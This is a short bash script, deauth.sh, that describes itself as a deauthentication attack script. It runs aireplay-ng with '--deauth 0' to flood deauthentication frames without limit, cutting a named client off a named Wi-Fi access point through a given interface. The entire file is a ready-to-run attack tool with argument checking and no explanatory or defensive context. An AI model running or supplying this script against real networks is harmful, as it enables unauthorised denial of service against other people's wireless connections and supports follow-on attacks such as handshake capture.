#!/bin/bash

# deauth.sh - Deauthentication attack script

# Function to perform deauthentication attack
deauth_attack() {
    echo "Starting deauthentication attack..."
    echo "Target AP: $1"
    echo "Client: $2"
    echo "Interface: $3"
    sudo aireplay-ng --deauth 0 -a "$1" -c "$2" "$3"
}

# Check if target AP, client, and interface are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <target_ap> <client> <interface>"
    exit 1
fi

TARGET_AP=$1
CLIENT=$2
INTERFACE=$3

deauth_attack "$TARGET_AP" "$CLIENT" "$INTERFACE"
